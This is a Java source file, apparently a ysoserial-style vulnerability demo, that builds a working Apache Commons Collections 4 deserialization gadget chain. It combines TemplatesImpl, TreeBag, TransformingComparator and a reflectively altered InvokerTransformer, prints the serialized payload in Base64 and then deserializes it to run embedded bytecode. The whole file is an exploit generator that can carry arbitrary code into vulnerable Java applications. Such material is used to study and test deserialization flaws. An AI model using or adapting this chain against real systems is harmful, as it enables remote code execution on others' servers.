package ysoserial.vulndemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class CC4_plus {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        //创建TemplatesImpl对象加载字节码
        byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","RoboTerh");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        //使用一个无害的InvokerTransformer
        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        //创建TreeBag对象
        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(obj);
        //更改调用方法
        setFieldValue(transformer, "iMethodName", "newTransformer");

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(treeBag);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
